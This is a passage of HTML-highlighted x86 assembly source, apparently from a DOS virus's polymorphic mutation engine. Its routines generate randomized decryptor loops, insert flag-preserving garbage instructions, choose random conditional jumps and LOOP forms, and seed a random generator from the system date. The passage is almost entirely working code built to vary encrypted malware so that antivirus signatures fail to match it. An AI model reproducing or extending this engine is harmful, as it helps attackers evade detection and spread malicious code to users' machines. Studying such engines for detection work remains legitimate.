        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">-</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0"> </span><span class="sc1">; Change it to "word but repre-</span><span class="sc0">
                          </span><span class="sc1">; sented by a signed byte" inst.</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store AL</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
   </span><span class="sc5">@@Salto001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store AX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PonADD</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; This procedure uses the procedure above. It only put in AH the bit field</span><span class="sc0">
</span><span class="sc1">;; (15,14) to 1,1 to set register operation on, and it jumps to the other rou-</span><span class="sc0">
</span><span class="sc1">;; tine because the other things to do are the same.</span><span class="sc0">
</span><span class="sc5">PonSUB</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">PonALGO</span><span class="sc0">
</span><span class="sc5">PonSUB</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; This routine inserts a compare instruction (for the decryption loop, to know</span><span class="sc0">
</span><span class="sc1">;; if it has to end decryption)</span><span class="sc0">
</span><span class="sc5">MeteComprueba</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Get counter register in DL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; Check if it is CX</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Gimma</span><span class="sc0">       </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">   </span><span class="sc1">;Is counter going fowards or backwards?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Gimma</span><span class="sc0">       </span><span class="sc1">; If it's going fowards, jump</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6000h</span><span class="sc0">   </span><span class="sc1">; Are we going to use any LOOP instr.?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@MeteParaLOOP</span><span class="sc0">    </span><span class="sc1">; If yes, jump here</span><span class="sc0">
    </span><span class="sc5">@@Gimma</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; Get random 0 or 1 in AL</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FuncionLogica</span><span class="sc0">   </span><span class="sc1">; If 0, jump here</span><span class="sc0">
  </span><span class="sc1">; This sets an instruction type "CMP AX,0000" or "ADD AX,+00", to change/set</span><span class="sc0">
  </span><span class="sc1">; flags and use them</span><span class="sc0">
</span><span class="sc5">@@Operacion</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">OpcodesComprueba</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; It gets an opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">      </span><span class="sc1">; for ADD, SUB, CMP or CMP (twice) :)</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Put got opcode in AH</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">      </span><span class="sc1">; Set register to opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">     </span><span class="sc1">; Set main opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save it on CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">      </span><span class="sc1">; Get random 0 or 2 in AL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Exchange instruction with random</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">      </span><span class="sc1">; Add 2 or nothing to opcode, to get</span><span class="sc0">
                    </span><span class="sc1">; 81h or 83h</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; AX=0</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">      </span><span class="sc1">; If it's opcode 83h, store only a byte</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Inserta1</span><span class="sc0">
 </span><span class="sc5">@@Inserta2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; If not, insert a word</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
 </span><span class="sc5">@@Inserta1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
  </span><span class="sc1">; This inserts an instruction type "AND AX,AX" or "TEST BP,BP"</span><span class="sc0">
</span><span class="sc5">@@FuncionLogica</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random number between 0 and 2</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FuncionLogica</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">OpcodesLogicos</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Get one of the op-</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">            </span><span class="sc1">; codes here (OR,AND or TEST)</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">     </span><span class="sc1">; Check if it's TEST</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salta</span><span class="sc0">       </span><span class="sc1">; If it's TEST, jump</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">      </span><span class="sc1">; Get a random 0 or 2</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">      </span><span class="sc1">; Add it to that got opcode</span><span class="sc0">
   </span><span class="sc5">@@Salta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">      </span><span class="sc1">; Construct an instruction type "Operation</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; Reg,Reg", being "Reg" the same in the</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">      </span><span class="sc1">; left and the right of the comma.</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
  </span><span class="sc1">; Here if we are going to put a LOOP instruction. We need a comparation to</span><span class="sc0">
  </span><span class="sc1">; activate some flags and make the LOOP. For example, to do a LOOPZ we insert</span><span class="sc0">
  </span><span class="sc1">; a comparation of a register with itself, so Zero Flag will be activated.</span><span class="sc0">
  </span><span class="sc1">; For a LOOPNZ, the best is compare CX with 0, because it's going to be fal-</span><span class="sc0">
  </span><span class="sc1">; se, so Zero Flag won't be activated</span><span class="sc0">
</span><span class="sc5">@@MeteParaLOOP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">      </span><span class="sc1">; Get type of LOOP in AH</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6000h</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; Check type of LOOP</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonLOOPZ</span><span class="sc0">    </span><span class="sc1">; Jump here if LOOPZ</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonLOOPNZ</span><span class="sc0">   </span><span class="sc1">; Jump here if LOOPNZ</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return if LOOP</span><span class="sc0">
 </span><span class="sc5">@@PonLOOPZ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">      </span><span class="sc1">; Get a random between 0 and 3 in AL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">     </span><span class="sc1">; Add "CMP" opcode</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">     </span><span class="sc1">; Get a random register</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">      </span><span class="sc1">; Put it on CL</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; Prepare it register field in second opc.</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">      </span><span class="sc1">; Set it on opcode</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">; Activate "register operation"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
 </span><span class="sc5">@@PonLOOPNZ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">     </span><span class="sc1">; Get a random 81h or 83h in AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc0">    </span><span class="sc1">; Construct "CMP CX,xxx"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">     </span><span class="sc1">; Check if the main opcode is 81h or 83h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; AL=0</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Mete1byte</span><span class="sc0">   </span><span class="sc1">; If 83h, put only one byte</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store byte with value 0</span><span class="sc0">
  </span><span class="sc5">@@Mete1byte</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store byte with value 0</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">MeteComprueba</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to insert garbage that doesn't affect to the flags that the de-</span><span class="sc0">
</span><span class="sc1">;; cryptor use to do certain things</span><span class="sc0">
</span><span class="sc5">HazBasuraSinBanderas</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random number in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003</span><span class="sc0">    </span><span class="sc1">; Get number of instructions</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin</span><span class="sc0">     </span><span class="sc1">; If 0, end</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Put it in CX</span><span class="sc0">
       </span><span class="sc5">@@Loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">BasuraNoBanderas</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Get a random ins-</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">         </span><span class="sc1">; truction from the 7 stored in</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">           </span><span class="sc1">; "BasuraNoBanderas"</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Loop</span><span class="sc0">        </span><span class="sc1">; Repeat CX times</span><span class="sc0">
    </span><span class="sc5">@@Fin</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">HazBasuraSinBanderas</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to put the jump to repeat all the decryption process (commonly</span><span class="sc0">
</span><span class="sc1">;; called "the decryption loop" :) ). It could be one of the LOOPs, or condi-</span><span class="sc0">
</span><span class="sc1">;; tional jumps of 8/16 bits displacement</span><span class="sc0">
</span><span class="sc5">MeteSaltoLoop</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0"> </span><span class="sc1">; If counter re-</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Bigibiggs</span><span class="sc0">    </span><span class="sc1">; gister isn't CX, jump here</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">    </span><span class="sc1">; Fowards or backwards?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Bigibiggs</span><span class="sc0">    </span><span class="sc1">; Jump if fowards</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6000h</span><span class="sc0">    </span><span class="sc1">; Does it use any LOOP?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Especial</span><span class="sc0">     </span><span class="sc1">; If it uses them, jump here</span><span class="sc0">
  </span><span class="sc1">; Here to put normal jumps (not LOOPs)</span><span class="sc0">
  </span><span class="sc5">@@Bigibiggs</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">    </span><span class="sc1">; Get if it goes fowards or backwards and set</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; 0 to BX if it goes backwards, otherwise put</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; 4 in BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Saltos</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Get a random conditional</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; jump from the 4 stored ones for</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">       </span><span class="sc1">; the two modes of counting</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">    </span><span class="sc1">; For increasing, it could be: JNZ, JS, JL or</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">          </span><span class="sc1">; JLE. For decreasing: JNZ, JNS, JGE or JG</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">    </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto16bits</span><span class="sc0"> </span><span class="sc1">; If Zero Flag, do 16 bits conditional jump</span><span class="sc0">
</span><span class="sc5">@@Salto8bits</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicLoop</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get address where the loop starts</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; Calculate negated size of decryp-</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">; tion loop</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">    </span><span class="sc1">; Put it like displacement and complete jump</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">         </span><span class="sc1">; instruction. Store it.</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">       </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">@@Salto16bits</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">   </span><span class="sc1">; Add 10h to opcode to convert it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">    </span><span class="sc1">; Put it on AH and put 0Fh like main opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">         </span><span class="sc1">; Store instruction (0F8?h)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicLoop</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get negated size of decryption</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">; loop</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">         </span><span class="sc1">; Store it like displacement (backwards)</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">       </span><span class="sc1">; Return</span><span class="sc0">
   </span><span class="sc1">; Here the LOOPs are constructed</span><span class="sc0">
 </span><span class="sc5">@@Especial</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">      </span><span class="sc1">; Get type of LOOP instruction (LOOP, LOOPZ</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6000h</span><span class="sc0">   </span><span class="sc1">; or LOOPNZ)</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">    </span><span class="sc1">; Convert bits to opcode (I prepared this</span><span class="sc0">
                    </span><span class="sc1">; data to do that)</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicLoop</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Calculate negated size of decryp-</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">        </span><span class="sc1">; tion loop and store it like displace-</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; ment</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">MeteSaltoLoop</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to initialize the random seed (when it has to initialize it)</span><span class="sc0">
</span><span class="sc5">InicAleatorio</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">      </span><span class="sc1">; Get date in CX and DX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFCh</span><span class="sc0">  </span><span class="sc1">; Get a different date only every four days</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Mix the two numbers (day/month with year)</span><span class="sc0">
